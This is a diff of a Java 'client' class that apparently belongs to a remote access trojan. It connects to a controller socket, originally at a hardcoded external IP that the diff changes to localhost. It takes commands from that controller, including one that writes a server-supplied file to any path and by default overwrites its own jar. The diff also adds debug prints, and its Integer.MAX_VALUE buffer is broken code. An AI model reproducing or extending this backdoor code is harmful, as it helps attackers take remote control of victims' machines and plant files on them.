@@ -26,7 +26,7 @@ public class client {
 				loc = client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
 				loc = loc.substring(1);
 				// Runtime.getRuntime().exec("cmd /c copy " + loc + " o.jar");
-				sock = new Socket("92.53.66.44", 32323);
+				sock = new Socket("localhost", 32323);
 				ps = new PrintStream(sock.getOutputStream());
 				din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
 				is = sock.getInputStream();
@@ -100,15 +100,20 @@ public class client {
 						ps.println("c");
 					}
 					if (line.equals("ul")) {
+						System.out.println("upload if statement");
 						String dest = din.readLine();
+						System.out.println("recieved file dest: " + dest);
 						if (dest.equals("de")) {
 							dest = loc;
+							System.out.println("default file dest: " + dest);
 						}
 						if (new File(dest.substring(0, dest.lastIndexOf(System.getProperty("file.separator"))))
 								.exists()) {
 							ps.println("ok");
+							System.out.println("dir exists");
 						} else {
 							ps.println("fe");
+							System.out.println("file doesn't exist");
 						}
 						byte[] rBytes = new byte[Integer.MAX_VALUE];
 						BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(dest));
